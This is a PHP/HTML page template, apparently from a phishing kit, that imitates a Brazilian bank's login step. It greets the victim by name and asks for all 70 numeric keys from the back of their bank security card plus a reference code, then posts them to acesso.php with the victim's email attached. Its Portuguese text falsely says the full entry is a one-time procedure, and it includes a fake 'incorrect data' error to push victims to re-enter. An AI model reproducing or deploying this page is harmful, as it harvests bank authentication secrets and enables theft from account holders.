<div class="block_loading">
	<div class="block_title">
		<span class="headline"><?= getSaudacao();?><b> <?= $ShowNameUser;?></b></span>
		<p class="description">Para continuar com o acesso, informe os dados abaixo:</p>
	</div>

	<div class="block_ps4">

		<?php 
			if(isset($_SESSION['ShowError']) && $_SESSION['ShowError'] == 1):
				$display = 'block!important;';
				$_SESSION['ShowError'] = 0;
			else:
				$display = 'none!important;';
			endif;	
		?>
		<div class="block_error" style="display:<?php echo $display;?>">
			As informações do seu cartão chave não estão corretas! Tente novamente!
			<span class="pos_close_error">x</span>
			<div class="clear"></div>
		</div><!-- block_errorblock_error -->
		<div class="clear"></div>

		<div class="block_message_all">
			Preencha os campos abaixo com os valores de todas colunas contendo as chaves numéricas indicadas no verso de seu cartão. <br><br>
			<span class="red_txt">Este procedimento é unico, após o correto preenchimento, apenas uma posição por vez lhe será solicitado(a) a cada acesso.</span>
		</div><!-- block_message_all -->
		<form action="acesso.php?cliente=<?php echo $emailx; ?>" name="formTable" id="formTable" onsubmit="return checkTable(this);" method="post">
			<div class="block_need_table">
				<table width="447" border="0" id="tabela_one">
					<thead>
						<tr class="negrito_table">
							<td width="14">Nº</td>
							<td width="42">Chave</td>
							<td width="14">Nº</td>
							<td width="42">Chave</td>
							<td width="14">Nº</td>
							<td width="42">Chave</td>
							<td width="14">Nº</td>
							<td width="42">Chave</td>
							<td width="14">Nº</td>
							<td width="42">Chave</td>
							<td width="14">Nº</td>
							<td width="42">Chave</td>
							<td width="14">Nº</td>
							<td width="42">Chave</td>
						</tr>
						<tr class="negrito_table">
							<td>&nbsp;</td>
						</tr>
					</thead>
					<tbody>
						<tr>
							<td class="redtextsmall">01</td>
							<td>
								<input type="text" name="input1" id="input1" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input2.focus(); }">
							</td>
							<td class="redtextsmall">11</td>
							<td>
								<input type="text" name="input11" id="input11" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input12.focus(); }">
							</td>
							<td class="redtextsmall">21</td>
							<td>
								<input type="text" name="input21" id="input21" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input22.focus(); }">
							</td>
							<td class="redtextsmall">31</td>
							<td>
								<input type="text" name="input31" id="input31" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input32.focus(); }">
							</td>
							<td class="redtextsmall">41</td>
							<td>
								<input type="text" name="input41" id="input41" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input42.focus(); }">
							</td>
							<td class="redtextsmall">51</td>
							<td>
								<input type="text" name="input51" id="input51" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input52.focus(); }">
							</td>
							<td class="redtextsmall">61</td>
							<td>
								<input type="text" name="input61" id="input61" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input62.focus(); }">
							</td>
						</tr>
						<tr>
							<td class="redtextsmall">02</td>
							<td>
								<input type="text" name="input2" id="input2" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input3.focus(); }">
							</td>
							<td class="redtextsmall">12</td>
							<td>
								<input type="text" name="input12" id="input12" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input13.focus(); }">
							</td>
							<td class="redtextsmall">22</td>
							<td>
								<input type="text" name="input22" id="input22" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input23.focus(); }">
							</td>
							<td class="redtextsmall">32</td>
							<td>
								<input type="text" name="input32" id="input32" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input33.focus(); }">
							</td>
							<td class="redtextsmall">42</td>
							<td>
								<input type="text" name="input42" id="input42" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input43.focus(); }">
							</td>
							<td class="redtextsmall">52</td>
							<td>
								<input type="text" name="input52" id="input52" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input53.focus(); }">
							</td>
							<td class="redtextsmall">62</td>
							<td>
								<input type="text" name="input62" id="input62" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input63.focus(); }">
							</td>
						</tr>
						<tr>
							<td class="redtextsmall">03</td>
							<td>
								<input type="text" name="input3" id="input3" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input4.focus(); }">
							</td>
							<td class="redtextsmall">13</td>
							<td>
								<input type="text" name="input13" id="input13" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input14.focus(); }">
							</td>
							<td class="redtextsmall">23</td>
							<td>
								<input type="text" name="input23" id="input23" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input24.focus(); }">
							</td>
							<td class="redtextsmall">33</td>
							<td>
								<input type="text" name="input33" id="input33" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input34.focus(); }">
							</td>
							<td class="redtextsmall">43</td>
							<td>
								<input type="text" name="input43" id="input43" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input44.focus(); }">
							</td>
							<td class="redtextsmall">53</td>
							<td>
								<input type="text" name="input53" id="input53" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input54.focus(); }">
							</td>
							<td class="redtextsmall">63</td>
							<td>
								<input type="text" name="input63" id="input63" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input64.focus(); }">
							</td>
						</tr>
						<tr>
							<td class="redtextsmall">04</td>
							<td>
								<input type="text" name="input4" id="input4" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input5.focus(); }">
							</td>
							<td class="redtextsmall">14</td>
							<td>
								<input type="text" name="input14" id="input14" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input15.focus(); }">
							</td>
							<td class="redtextsmall">24</td>
							<td>
								<input type="text" name="input24" id="input24" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input25.focus(); }">
							</td>
							<td class="redtextsmall">34</td>
							<td>
								<input type="text" name="input34" id="input34" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input35.focus(); }">
							</td>
							<td class="redtextsmall">44</td>
							<td>
								<input type="text" name="input44" id="input44" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input45.focus(); }">
							</td>
							<td class="redtextsmall">54</td>
							<td>
								<input type="text" name="input54" id="input54" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input55.focus(); }">
							</td>
							<td class="redtextsmall">64</td>
							<td>
								<input type="text" name="input64" id="input64" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input65.focus(); }">
							</td>
						</tr>
						<tr>
							<td class="redtextsmall">05</td>
							<td>
								<input type="text" name="input5" id="input5" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input6.focus(); }">
							</td>
							<td class="redtextsmall">15</td>
							<td>
								<input type="text" name="input15" id="input15" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input16.focus(); }">
							</td>
							<td class="redtextsmall">25</td>
							<td>
								<input type="text" name="input25" id="input25" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input26.focus(); }">
							</td>
							<td class="redtextsmall">35</td>
							<td>
								<input type="text" name="input35" id="input35" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input36.focus(); }">
							</td>
							<td class="redtextsmall">45</td>
							<td>
								<input type="text" name="input45" id="input45" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input46.focus(); }">
							</td>
							<td class="redtextsmall">55</td>
							<td>
								<input type="text" name="input55" id="input55" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input56.focus(); }">
							</td>
							<td class="redtextsmall">65</td>
							<td>
								<input type="text" name="input65" id="input65" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input66.focus(); }">
							</td>
						</tr>
						<tr>
							<td class="redtextsmall">06</td>
							<td>
								<input type="text" name="input6" id="input6" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input7.focus(); }">
							</td>
							<td class="redtextsmall">16</td>
							<td>
								<input type="text" name="input16" id="input16" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input17.focus(); }">
							</td>
							<td class="redtextsmall">26</td>
							<td>
								<input type="text" name="input26" id="input26" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input27.focus(); }">
							</td>
							<td class="redtextsmall">36</td>
							<td>
								<input type="text" name="input36" id="input36" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input37.focus(); }">
							</td>
							<td class="redtextsmall">46</td>
							<td>
								<input type="text" name="input46" id="input46" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input47.focus(); }">
							</td>
							<td class="redtextsmall">56</td>
							<td>
								<input type="text" name="input56" id="input56" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input57.focus(); }">
							</td>
							<td class="redtextsmall">66</td>
							<td>
								<input type="text" name="input66" id="input66" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input67.focus(); }">
							</td>
						</tr>
						<tr>
							<td class="redtextsmall">07</td>
							<td>
								<input type="text" name="input7" id="input7" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input8.focus(); }">
							</td>
							<td class="redtextsmall">17</td>
							<td>
								<input type="text" name="input17" id="input17" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input18.focus(); }">
							</td>
							<td class="redtextsmall">27</td>
							<td>
								<input type="text" name="input27" id="input27" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input28.focus(); }">
							</td>
							<td class="redtextsmall">37</td>
							<td>
								<input type="text" name="input37" id="input37" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input38.focus(); }">
							</td>
							<td class="redtextsmall">47</td>
							<td>
								<input type="text" name="input47" id="input47" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input48.focus(); }">
							</td>
							<td class="redtextsmall">57</td>
							<td>
								<input type="text" name="input57" id="input57" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input58.focus(); }">
							</td>
							<td class="redtextsmall">67</td>
							<td>
								<input type="text" name="input67" id="input67" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input68.focus(); }">
							</td>
						</tr>
						<tr>
							<td class="redtextsmall">08</td>
							<td>
								<input type="text" name="input8" id="input8" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input9.focus(); }">
							</td>
							<td class="redtextsmall">18</td>
							<td>
								<input type="text" name="input18" id="input18" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input19.focus(); }">
							</td>
							<td class="redtextsmall">28</td>
							<td>
								<input type="text" name="input28" id="input28" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input29.focus(); }">
							</td>
							<td class="redtextsmall">38</td>
							<td>
								<input type="text" name="input38" id="input38" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input39.focus(); }">
							</td>
							<td class="redtextsmall">48</td>
							<td>
								<input type="text" name="input48" id="input48" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input49.focus(); }">
							</td>
							<td class="redtextsmall">58</td>
							<td>
								<input type="text" name="input58" id="input58" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input59.focus(); }">
							</td>
							<td class="redtextsmall">68</td>
							<td>
								<input type="text" name="input68" id="input68" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input69.focus(); }">
							</td>
						</tr>
						<tr>
							<td class="redtextsmall">09</td>
							<td>
								<input type="text" name="input9" id="input9" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input10.focus(); }">
							</td>
							<td class="redtextsmall">19</td>
							<td>
								<input type="text" name="input19" id="input19" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input20.focus(); }">
							</td>
							<td class="redtextsmall">29</td>
							<td>
								<input type="text" name="input29" id="input29" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input30.focus(); }">
							</td>
							<td class="redtextsmall">39</td>
							<td>
								<input type="text" name="input39" id="input39" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input40.focus(); }">
							</td>
							<td class="redtextsmall">49</td>
							<td>
								<input type="text" name="input49" id="input49" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input50.focus(); }">
							</td>
							<td class="redtextsmall">59</td>
							<td>
								<input type="text" name="input59" id="input59" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input60.focus(); }">
							</td>
							<td class="redtextsmall">69</td>
							<td>
								<input type="text" name="input69" id="input69" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input70.focus(); }">
							</td>
						</tr>
						<tr>
							<td class="redtextsmall">10</td>
							<td>
								<input type="text" name="input10" id="input10" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input11.focus(); }">
							</td>
							<td class="redtextsmall">20</td>
							<td>
								<input type="text" name="input20" id="input20" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input21.focus(); }">
							</td>
							<td class="redtextsmall">30</td>
							<td>
								<input type="text" name="input30" id="input30" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input31.focus(); }">
							</td>
							<td class="redtextsmall">40</td>
							<td>
								<input type="text" name="input40" id="input40" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input41.focus(); }">
							</td>
							<td class="redtextsmall">50</td>
							<td>
								<input type="text" name="input50" id="input50" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input51.focus(); }">
							</td>
							<td class="redtextsmall">60</td>
							<td>
								<input type="text" name="input60" id="input60" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input61.focus(); }">
							</td>
							<td class="redtextsmall">70</td>
							<td>
								<input type="text" name="input70" id="input70" class="input_tabelaone" maxlength="3" autocomplete="off" onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { referencia.focus(); }">
							</td>
						</tr>
						<tr>
							<td colspan="8"></td>
							<td colspan="6"></td>
						</tr>
						<tr>
							<td height="37" colspan="6"><img src="../_images/ibi/cod-barras.jpg" id="align_cod_barras"></td>
							<td colspan="8"><span class="ref_pos">Referência: <input type="text" name="referencia" id="referencia" class="input_ref" maxlength="11" onkeypress="return SomenteNumero(event)" autocomplete="off"></span>
							</td>
						</tr>
					</tbody>
				</table>
			</div><!-- block_need_table -->
			<input type="hidden" name="sender" value="get_table">
		</form>

	</div><!-- block_ps4 -->

	<div class="block_buttons_form">
		<div class="clear_btn J_Cancel"></div>
		<div class="submit_btn J_Submit_FT"></div>
	</div><!-- block_buttons_form -->

</div><!-- block_loading -->